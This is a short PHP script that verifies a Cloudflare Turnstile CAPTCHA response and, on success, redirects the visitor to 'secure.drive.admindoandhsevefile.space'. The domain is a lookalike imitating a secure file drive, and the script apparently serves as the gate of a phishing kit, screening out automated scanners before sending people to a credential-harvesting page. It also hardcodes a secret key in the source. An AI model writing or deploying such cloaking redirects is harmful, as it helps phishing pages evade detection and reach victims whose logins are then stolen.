<?php
// Replace this with your actual Cloudflare Secret Key
$secretKey = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA';

// Check if the response was posted
if (isset($_POST['cf-turnstile-response'])) {
    $response = $_POST['cf-turnstile-response'];

    // Prepare data for verification
    $data = [
        'secret' => $secretKey,
        'response' => $response,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    ];

    // Send POST request to Cloudflare's verification endpoint
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded",
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
    $verification = json_decode($result);

    // If verification passed, redirect user
    if ($verification && $verification->success) {
        header("Location: https://secure.drive.admindoandhsevefile.space/hKYUcWCu");
        exit;
    } else {
        echo "<h3>Verification failed. Please try again.</h3>";
    }
} else {
    echo "<h3>No verification response received.</h3>";
}
?>
